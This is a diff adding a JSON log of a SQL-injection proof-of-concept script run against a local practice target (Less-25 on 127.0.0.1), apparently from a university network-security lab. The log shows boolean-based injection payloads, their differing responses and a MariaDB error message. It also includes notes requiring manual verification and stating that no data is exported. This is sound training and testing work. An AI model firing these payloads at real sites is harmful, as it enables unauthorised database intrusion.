@@ -1,0 +1,24 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\SQLI-003__1.py",
+    "--base",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-25/"
+  ],
+  "started_at": "2026-10-20T14:42:38+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.218,
+  "stdout": "[baseline] payload='1'\r\n    transport=response status=200\r\n    row_present=True login_len=4 pwd_len=4 login_digest=ab36924f49eb\r\n    filtered_hint='1'\r\n[true_cond] payload=\"1' && '1'='1\"\r\n    transport=response status=200\r\n    row_present=True login_len=4 pwd_len=4 login_digest=ab36924f49eb\r\n    filtered_hint=\"1' && '1'='1\"\r\n[false_cond] payload=\"1' && '1'='2\"\r\n    transport=response status=200\r\n    row_present=False login_len=0 pwd_len=0 login_digest=None\r\n    filtered_hint=\"1' && '1'='2\"\r\n[quote_break] payload=\"1'\"\r\n    transport=response status=200\r\n    row_present=False login_len=0 pwd_len=0 login_digest=None\r\n    filtered_hint=\"1'\"\r\n    db_error_text=\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line\"\r\n\r\n== 判定辅助(仅本地观测, 不代替人工核验) ==\r\n3) 基线命中: login_digest=ab36924f49eb pwd_len=4\r\n4) 观测到布尔差分: 真条件沿用基线命中行, 假条件无命中行;\r\n   该差异只在注入改变查询语义时出现, 仍需人工回看原始响应。\r\n5) 引号诊断: db_error_text=\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line\"\r\n   注意: 仅出现 SQL 错误文本只说明错误回显, 不能单独证明注入可利用;\r\n   以 3)/4) 的行命中差异为主证据, 错误文本用于排除语法假设。\r\n\r\n提示: 运行结束后人工保存命令、环境、响应与截图; 不导出数据库内容。\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "SQLI-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\SQLI-003__1.py",
+  "args_redacted": [
+    "--base",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-25/"
+  ]
+}
